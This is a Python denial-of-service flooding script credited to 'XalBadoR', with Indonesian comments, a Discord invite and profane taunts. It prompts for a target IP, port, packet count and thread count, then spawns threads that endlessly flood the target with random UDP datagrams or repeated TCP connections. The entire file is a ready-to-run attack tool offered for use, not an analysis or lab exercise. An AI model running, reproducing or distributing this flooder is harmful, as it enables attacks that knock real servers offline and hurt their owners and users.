#!/usr/bin/env python3
#Semoga yang curi script ortunya sehat selalu
#Ddos by XalBadoR
#Join My T3Am : https://discord.gg/fRDAvXsU
import random
import socket
import threading
import os

os.system("clear")
print("DDoSaTtack by Xalbador")
print("Kalau Mau Pakek Ganteng Dulu")
print("Mau rename? PM me ")
ip = str(input(" DdosAttackByXalbador | Ip:"))
port = int(input(" DdosAttackByXalbador | Port:"))
choice = str(input(" DdosAttackByXalbador | Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttackByXalbador | Packets:"))
threads = int(input(" DdosAttackByXalbador | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | XalbadorX |")
		except:
			print("[!] | Server down kontol!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Xalbador nih bos!!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
